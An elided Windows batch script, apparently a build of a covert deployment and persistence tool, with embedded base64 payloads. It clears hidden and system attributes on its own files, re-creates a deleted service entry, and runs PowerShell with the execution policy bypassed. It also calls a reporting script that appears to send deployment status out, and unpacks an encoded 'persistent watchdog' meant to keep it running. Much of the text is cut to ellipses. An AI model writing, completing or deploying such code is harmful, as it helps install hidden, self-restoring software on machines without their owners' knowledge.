...
REM OWN BUILD 20260802O23 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback
...
if /I not "%~1"=="_RUN" (
  ...
  REM O23: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
  ...
  findstr /C:"OWN BUILD 20260802O23" "%BOOT%\own_run.cmd" >nul 2>&1
  if errorlevel 1 (
    set "RUNNER=%BOOT%\own_o23_%RANDOM%%RANDOM%.cmd"
    ...
    set "RUNNER=%SELF%"
    findstr /C:"OWN BUILD 20260802O23" "%SELF%" >nul 2>&1
  ...
  echo engine=cmd_detached_o23>>"%LOG%"
...
REM O23: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M14" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
...
REM O23: restore ALT if its service entry was deleted (SC-family msiexec side effect)
...
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O23 -Extra "deploy" >nul 2>&1
...
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O23 >>"%LOG%" 2>&1
...
MDgwMk0xNApyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
...
ZXQgIk1PTlZFUj1NMTQiCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIgpmb3IgL2YgInRv
...

...

...

...

...

::B64_MON_END
::B64_SEC_BEGIN
